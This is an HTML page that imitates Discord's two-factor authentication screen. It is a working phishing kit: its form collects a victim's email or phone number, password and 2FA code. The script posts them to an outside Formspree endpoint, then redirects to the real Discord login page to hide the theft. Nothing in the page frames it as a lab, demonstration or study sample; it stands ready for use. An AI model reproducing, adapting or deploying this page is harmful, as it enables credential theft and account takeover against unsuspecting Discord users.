<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

        body {
            background-color: #5865F2;
            background-image: url('https://assets-global.website-files.com/6257adef93867e56f84d3092/63600e80220b8f8e57d7069e_Discord%20Background.webp');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #313338;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.24);
            width: 320px;
            text-align: center;
            color: #dbdee1;
        }

        h2 {
            color: #f2f3f5;
            margin-top: 0;
            margin-bottom: 8px;
            font-size: 24px;
            font-weight: 600;
        }

        p {
            color: #b5bbd0;
            font-size: 14px;
            margin-bottom: 20px;
        }

        label {
            color: #b5bbd0;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            display: block;
            text-align: left;
            margin-bottom: 8px;
        }

        input {
            background-color: #1e1f22;
            border: none;
            border-radius: 3px;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
            color: #dbdee1;
            font-size: 16px;
            margin-bottom: 16px;
        }

        input:focus {
            outline: 2px solid #00affa;
        }

        button {
            background-color: #5865F2;
            color: white;
            border: none;
            border-radius: 3px;
            padding: 12px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #4752c4;
        }

        .footer {
            margin-top: 16px;
            font-size: 14px;
            color: #b5bbd0;
        }
        
        .footer a {
            color: #00affa;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Two-Factor Authentication</h2>
        <p>Enter your 2FA code to verify your identity.</p>

        <form id="discordForm">
            <label>EMAIL OR PHONE NUMBER</label>
            <input type="text" name="email" id="email" placeholder="Email or Phone Number" required>

            <label>PASSWORD</label>
            <input type="password" name="password" id="password" placeholder="Password" required>

            <label>2FA CODE</label>
            <input type="text" name="2fa_code" id="2fa_code" placeholder="6-digit code" maxlength="6" pattern="[0-9]*" inputmode="numeric" required>

            <button type="button" id="loginBtn">LOG IN</button>
        </form>

        <div class="footer">
            <p><a href="#">Didn't get the code?</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginBtn').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const code = document.getElementById('2fa_code').value;

            // 1. Send data to Formspree
            fetch('https://formspree.io/f/mzezjyry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email, password: password, code: code })
            }).then(() => {
                // 2. Redirect to the REAL Discord Login page
                window.location.href = 'https://discord.com/login';
            });
        });
    </script>

</body>
</html>
